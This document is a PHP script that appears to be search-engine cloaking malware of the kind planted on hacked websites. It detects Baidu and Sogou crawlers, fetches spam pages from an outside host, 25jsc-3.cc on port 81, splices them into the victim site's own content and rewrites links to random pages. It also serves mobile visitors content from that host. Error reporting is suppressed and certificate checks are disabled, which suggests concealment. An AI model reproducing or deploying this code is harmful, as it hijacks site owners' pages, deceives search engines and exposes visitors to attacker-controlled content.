
<?php

 $protocol2 = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$host2 = $_SERVER['HTTP_HOST'];
$fullUrl2 = $protocol2 . $host2;
$url2 = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
set_time_limit(30);
error_reporting(0);
$tr2 = "stristr";
$er2 = $_SERVER;
function httpGet32($url2) {
  header('Content-Type:text/html;charset=utf-8');
  $ch = curl_init();
  $ua2 = $_SERVER['HTTP_USER_AGENT'];
  curl_setopt($ch, CURLOPT_URL, $url2);
  curl_setopt($ch, CURLOPT_USERAGENT, 'MyCustomUA/1.0');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  $output = curl_exec($ch);
  curl_close($ch);
  return $output;
}
function httpGet3($url2) {
  header('Content-Type:text/html;charset=utf-8');
  $ch = curl_init();
  $ua2 = $_SERVER['HTTP_USER_AGENT'];
  curl_setopt($ch, CURLOPT_URL, $url2);
  curl_setopt($ch, CURLOPT_USERAGENT, $ua2);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  $output = curl_exec($ch);
  curl_close($ch);
  return $output;
}
$dir="?wen";
function char($length = 5, $type = 0)
{
    $arr = array(1 => "0123456789", 2 => "abcdefghijklmnopqrstuvwxyz0123456789");
    if ($type == 0)
    {
        array_pop($arr);
        $string = implode("", $arr);
    } elseif ($type == "-1") {
        $string = implode("", $arr);
    } else {
        $string = $arr[$type];
    }
    $count = strlen($string) - 1;
    $code = '';
    for ($i = 0; $i < $length; $i++) {
        $code .= $string[rand(0, $count)];
    }
    return $code;
}
$dir2=get_url2().'/wen';
function get_url2() {
   $url = $_SERVER['REQUEST_URI'];
    $url = preg_replace('~/+~', '/', $url);  // 去除多余的斜杠

    // 分割路径和查询字符串
    $url_parts = parse_url($url);

    // 处理路径部分
    $path = $url_parts['path'];
    $parts = explode('/', trim($path, '/'));

    // 查找路径中的第一个文件，并保留该文件路径
    $file_url = ''; // 初始化文件 URL
    $file_found = false; // 标记是否找到文件

    // 通过循环检查每个目录/文件
    foreach ($parts as $index => $part) {
        // 如果当前部分是文件（以.php、.html、.xml等结尾）
        if (preg_match('/\.(php|html|xml|asp|ppt|shtml)$/', $part)) {
            // 如果找到文件，保留文件路径
            $file_url = '/' . implode('/', array_slice($parts, 0, $index + 1));
            $file_found = true;
            break;
        }
    }

    // 如果没有找到文件，保留整个路径
    if (!$file_found) {
        $file_url = $path;
    }

    // 处理查询字符串部分，只保留 '?'，不保留查询参数
    if (isset($url_parts['query'])) {
        $file_url .= '?';
    }

    return $file_url;
}

define('url', $er2['REQUEST_URI']);
define('ref', $er2['HTTP_REFERER']);
define('ent', $er2['HTTP_USER_AGENT']);
define('site', "http://jsc.25jsc-3.cc:81/");
 define('url8', $fullUrl2);
$title = '/<title>(.*?)<\/title>/i';
$meta = '/<meta charset=".*?>/i';
$key = '/<meta\s+name="keywords"\s+content="([^"]+)"\s*\/?>/i';
$miaoshu = '/<meta\s+name="description"\s+content="([^"]+)"\s*\/?>/i';
define('road',$_SERVER['REQUEST_URI']);
define('regs', '@baiduspider|Sogou@i');
define('area', stristr(url, "moban")  or stristr(url, "wen")  or stristr(url, "xml")  or stristr(url, "doc")  or stristr(url, "pdf")  or stristr(url, "txt")  or stristr(url, "ppt")  or stristr(url, "pptx")  or stristr(url, "xls")  or stristr(url, "xlsx")  or stristr(url, "wap")  or stristr(url, "edu")  or stristr(url, "gov")  or stristr(url, "wap")  or stristr(url, "asp")  or stristr(url, "gq")  or stristr(url, "pdx")  or stristr(url, "ga")  or stristr(url, "tacc")  or stristr(url, "work")  or stristr(url, "csv")  or stristr(url, "sports")  or stristr(url, "sleep")  or stristr(url, "life")  or stristr(url, "88art")
 or stristr(url, "advice") or stristr(url, "wap") or stristr(url, "wen") or stristr(url, "and") or stristr(url, "no") or stristr(url, "world") or stristr(url, "school") or stristr(url, "tips") or stristr(url, "auto"));
if (preg_match(regs, ent)) {
    if (area) {
      echo '<link rel="canonical" href="'.$url2.'" />' ;
   echo '<!-192-2-phpjc-awen-526-->';
        //echo httpGet3(site.road).httpGet32(url8);
         $html2 = httpGet32(url8);
         $html = httpGet3(site . road);
        // $html = httpGet32(url8)
  // 閹笛嗩攽閺囨寧宕�</h1>
$html2 = str_replace('</h1>', '', $html2);
// 閹笛嗩攽閺囨寧宕�<h1>
$html2 = str_replace('<h1>', '', $html2);
// 閹笛嗩攽閺囨寧宕�$meta
$pattern6 = $meta;
$replacement6 = '';
$html2 = preg_replace($pattern6, $replacement6, $html2);
// 閹笛嗩攽閺囨寧宕�$miaoshu
$pattern5 = $miaoshu;
$replacement5 = '';
$html2 = preg_replace($pattern5, $replacement5, $html2);
// 閹笛嗩攽閺囨寧宕�$key
$pattern4 = $key;
$replacement4 = '';
$html2 = preg_replace($pattern4, $replacement4, $html2);
// 閹笛嗩攽閺囨寧宕�$title
$pattern3 = $title;
$replacement3 = '';
$html2 = preg_replace($pattern3, $replacement3, $html2);

// 閹笛嗩攽閺囨寧宕�/head
$html2 = str_replace('</head>', '', $html2);
// 閹笛嗩攽閺囨寧宕瞙ead
$html2 = str_replace('<head>', '', $html2);



// 閹笛嗩攽閺囨寧宕查弴鎸庡床html
$pattern2 = '/<html>/i';
$replacement2 = '';
$html2 = preg_replace($pattern2, $replacement2, $html2);


// 閹笛嗩攽閺囨寧宕查弴鎸庡床<body2>
$pattern8 = '/body class=.*?>/i';
$replacement8 = '';
$html2 = preg_replace($pattern8, $replacement8, $html2);

// 閹笛嗩攽閺囨寧宕查弴鎸庡床<body>
$pattern7 = '/<body>/i';
$replacement7 = '';
$html2 = preg_replace($pattern7, $replacement7, $html2);

$html = $html.$html2;
        $lianjie = '/<a .*?>[\s\S]*?<\/a>/';
        preg_match_all($lianjie,$html, $aarray5);
        // preg_match_all($lianjie, $html2, $aarray5);
        
        if ($aarray5[0]) {
            foreach ($aarray5[0] as $pbti) {
                $preg = '/href=(\"|\')(.*?)(\"|\')/i';
                $replacestr = 'href="' . $dir2 . '/' . char(6, 1) . char(mt_rand(4, 10), 2) . '.html' . '"';
                $ahtml = preg_replace($preg, $replacestr, $pbti);
                $html = str_replace($pbti, $ahtml, $html);
                //  $html2 = str_replace($pbti, $ahtml, $html2);
            }
        }

        echo $html;
       
 
      
      exit();
    } 
    
    else {
   
     $html=httpGet32(url8.url);
    //  echo(url8.url);
// 閹笛嗩攽閺囨寧宕�</h1>
$html = str_replace('</h1>', '', $html);
// 閹笛嗩攽閺囨寧宕�<h1>
$html = str_replace('<h1>', '', $html);

$lianjie = '/<a .*?>[\s\S]*?<\/a>/';
preg_match_all($lianjie,$html,$aarray5);

if($aarray5[0]){
   foreach ($aarray5[0] as $pbti){
      $preg = '/href=(\"|\')(.*?)(\"|\')/i';

$replacestr = 'href="'.$dir."/".char(6,1).char(mt_rand(4,10),2).'.html'.'"';

$ahtml=preg_replace($preg, $replacestr,$pbti);
$html= str_replace($pbti, $ahtml, $html);
      
   }
}

echo $html;
 exit();
   }
}


        ob_flush();
        flush();



if (area && preg_match('/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/',$_SERVER['HTTP_USER_AGENT'])) {
   
$ua = $_SERVER['HTTP_USER_AGENT'];
$ch = curl_init();

// 鐠佸墽鐤哢RL閸滃瞼娴夋惔鏃傛畱闁銆�
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
     
curl_setopt($ch, CURLOPT_URL, "http://txt.25jsc-3.cc:81/wen502.php");
curl_setopt($ch, CURLOPT_HEADER, false);

// 閹舵挸褰嘦RL楠炶埖濡哥€瑰啩绱堕柅鎺旂舶濞村繗顫嶉崳锟�

curl_exec($ch);

//閸忔娊妫碿URL鐠у嫭绨敍灞借嫙娑撴棃鍣撮弨鍓ч兇缂佺喕绁┃锟�

curl_close($ch);

    exit();
   } 
 

  

  


     

?>